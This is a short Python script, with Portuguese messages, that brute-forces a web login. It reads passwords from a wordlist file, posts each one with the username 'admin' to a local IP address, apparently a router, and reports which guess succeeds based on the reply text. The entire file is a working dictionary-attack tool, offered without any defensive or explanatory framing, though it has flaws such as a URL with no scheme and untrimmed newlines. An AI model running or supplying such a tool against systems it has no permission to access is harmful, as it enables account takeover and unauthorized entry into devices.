import requests

url = '192.168.15.1'

arquivo = open('lista.txt')
linhas = arquivo.readlines()

for linha in linhas:
    dados = {'username' : 'admin',
             'password' : linha}
    
    resposta = requests.post(url, data=dados)

    if "senha errados" in resposta.text:
        print ('Senha incorreta: {}'.format(linha))
    
    else:
        print ('Senha correta: {}'.format(linha))

